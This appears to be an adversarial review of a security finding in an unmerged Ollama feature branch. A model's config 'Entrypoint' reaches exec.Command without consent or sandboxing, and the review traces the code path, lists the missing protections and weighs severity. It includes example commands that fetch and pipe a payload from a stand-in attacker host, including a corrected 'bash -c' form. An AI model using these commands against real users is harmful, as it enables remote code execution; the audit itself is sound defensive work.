# Adversarial Review: p4-f01-entrypoint-rce

## Sub-claim Decomposition

- **Sub-claim A (Attacker controls input)**: CONFIRMED. The `Entrypoint` field in `ConfigV2` (types/model/config.go:51) is a JSON string in the OCI config blob, set by whoever publishes the model. The server passes it verbatim to the client via `/api/show` (server/routes.go:1125).
- **Sub-claim B (Input reaches exec without sanitization)**: CONFIRMED. `info.Entrypoint` -> `opts.Entrypoint` (cmd/cmd.go:506) -> `runEntrypoint()` (cmd/cmd.go:536) -> `strings.Fields` split -> `exec.Command(execPath, args...)` (cmd/cmd.go:619). No allowlist, no consent prompt, no experimental flag check, no sandboxing.
- **Sub-claim C (Arbitrary command execution)**: CONFIRMED. `exec.Command` with inherited stdin/stdout/stderr executes any command found in PATH.

## Code Path Trace

1. `cmd/cmd.go:462` - `client.Show()` retrieves model info including Entrypoint
2. `cmd/cmd.go:500` - `isAgent` check includes `info.Entrypoint != ""`
3. `cmd/cmd.go:506` - `opts.Entrypoint = info.Entrypoint` (no validation)
4. `cmd/cmd.go:533` - `isExperimental` flag retrieved but NEVER checked before entrypoint
5. `cmd/cmd.go:535-536` - If entrypoint non-empty, immediately calls `runEntrypoint(cmd, opts)`
6. `cmd/cmd.go:584-625` - `runEntrypoint()`: `strings.Fields` split, `exec.LookPath`, `exec.Command`, `proc.Run()`

## Protection Surface

| Layer | Protection Found | Blocks Attack? |
|-------|-----------------|----------------|
| Language | Go type system (string) | No |
| Framework | None | No |
| Application | `isExperimental` flag retrieved but unused | No |
| Application | No consent prompt | No |
| Application | No allowlist | No |
| Application | No sandbox | No |
| Server | Verbatim passthrough of Entrypoint | No |

## Reproduction

PoC-Status: theoretical. Blocked by infrastructure requirements (need full Ollama build from parth/agents branch + registry with custom model). Code analysis is unambiguous.

## Technical Correction

The finding's attack scenario (`ENTRYPOINT curl attacker.com/payload | sh`) is technically inaccurate. `exec.Command` does not interpret shell pipes; the `|` and `sh` would be passed as literal arguments to `curl`. However, this is trivially bypassed with `ENTRYPOINT bash -c "curl attacker.com/payload | sh"` or any other shell-wrapped command. The core vulnerability is real.

## Prosecution Brief

The code path from attacker-controlled registry data to `exec.Command` is direct, unvalidated, and ungated. Specifically:
- `ConfigV2.Entrypoint` is deserialized from the OCI config blob with no sanitization
- Server passes it verbatim to the client
- Client executes it immediately upon `ollama run` without any consent gate
- The `isExperimental` flag is fetched but never checked, suggesting planned-but-unimplemented gating
- An attacker publishing `"entrypoint": "bash -c 'malicious command'"` achieves full RCE

## Defense Brief

- The code exists only on `remotes/origin/parth/agents`, an unmerged feature branch
- No released Ollama build is affected
- The specific attack scenario in the finding (pipe syntax) wouldn't work as written with exec.Command
- The `isExperimental` flag retrieval suggests gating was planned
- Requires social engineering (victim must run attacker's model name)

## Severity Challenge

Starting at MEDIUM:
- Upgrade to HIGH: remotely triggerable (registry), meaningful trust boundary crossing (network to local exec), low preconditions on the branch
- Not CRITICAL because: pre-merge code, not in any release, requires victim to run specific model
- Severity-Original was CRITICAL; challenged to HIGH due to pre-merge status

## Verdict

Adversarial-Verdict: CONFIRMED
Adversarial-Rationale: Direct, unvalidated code path from attacker-controlled OCI config field to exec.Command with no consent gate, allowlist, or sandbox; isExperimental flag retrieved but never checked.
Severity-Final: HIGH (downgraded from CRITICAL due to pre-merge branch status)
PoC-Status: theoretical (blocked by infrastructure, not by any protection)
